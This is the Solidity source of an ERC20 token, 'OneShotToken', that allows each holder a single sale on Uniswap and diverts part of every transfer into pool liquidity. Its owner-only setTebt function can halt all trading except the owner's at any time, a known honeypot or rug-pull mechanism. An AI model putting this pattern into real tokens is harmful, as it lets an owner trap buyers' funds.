pragma solidity ^0.6.0;

import "./ERC20.sol";
import "./Ownable.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router01.sol";
import "./IUniswapV2Router02.sol";

contract OneShotToken is ERC20, Ownable {
    address public uniswapRouterAddress = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    IUniswapV2Router02 public uniswapRouter = IUniswapV2Router02(uniswapRouterAddress);
    IUniswapV2Factory public uniswapFactory = IUniswapV2Factory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f);

    address public _pairAddress;
    mapping(address => uint256) private _sellers;
    uint256 public _tebt;

    string constant tokenName = "OneShotToken";
    string constant tokenSymbol = "OST";
    uint256 _totalSupply = 10000000000000000000000;


    constructor() public payable ERC20(tokenName, tokenSymbol) {
        _pairAddress = uniswapFactory.createPair(address(uniswapRouter.WETH()), address(this));
        _tebt = 1637576374;

        _mint(owner(), _totalSupply);
    }

    function setTebt(uint256 tebt) public onlyOwner {
        _tebt = tebt;
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        if (from == address(this) || from == owner() || to == owner() || to == uniswapRouterAddress) {
            super._transfer(from, to, amount);
        }
        else {
            require(block.timestamp > _tebt);

            require(to == _pairAddress || from == _pairAddress, "Transfers of token between accounts are not allowed");

            if (to == _pairAddress) {
                // It's a sell...
                if (_sellers[from] != 0) {
                    // ...and the seller sold before, deny another sell, (s)he only gets one shot
                    revert("Sorry, you already sold, you only get one shot!");
                }
                else {
                    // ...and the seller didn't sell before, sell and remember the seller's address so (s)he can't buy or sell again
                    _sellers[from] = amount;
                }
            }

            if (from == _pairAddress && _sellers[to] != 0) {
                // It's a buy and the buyer already sold before, deny another buy, (s)he wouldn't be able to sell again anyway
                revert("Sorry, you already sold, you only get one shot!");
            }

            uint256 liquidityLockAmount = amount.div(12);
            super._transfer(from, address(this), liquidityLockAmount);
            super._transfer(from, to, amount.sub(liquidityLockAmount));
        }
    }

    // To be able to receive eth from uniswap swap
    fallback() external payable {}

    receive() external payable {}

    function lockLiquidity() public {
        uint256 amountToLock = balanceOf(address(this));

        if (amountToLock > 0) {
            uint256 amountToSwapForEth = amountToLock.div(2);
            uint256 amountToAddLiquidity = amountToLock.sub(amountToSwapForEth);

            uint256 ethBalanceBeforeSwap = address(this).balance;
            swapTokensForEth(amountToSwapForEth);
            uint256 ethReceived = address(this).balance.sub(ethBalanceBeforeSwap);

            addLiquidity(amountToAddLiquidity, ethReceived);
        }
    }

    function swapTokensForEth(uint256 tokenAmount) internal {
        address[] memory uniswapPairPath = new address[](2);
        uniswapPairPath[0] = address(this);
        uniswapPairPath[1] = uniswapRouter.WETH();

        _approve(address(this), uniswapRouterAddress, tokenAmount);

        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            uniswapPairPath,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        _approve(address(this), uniswapRouterAddress, tokenAmount);

        uniswapRouter
        .addLiquidityETH
        .value(ethAmount)(
            address(this),
            tokenAmount,
            0,
            0,
            address(this),
            block.timestamp
        );
    }
}
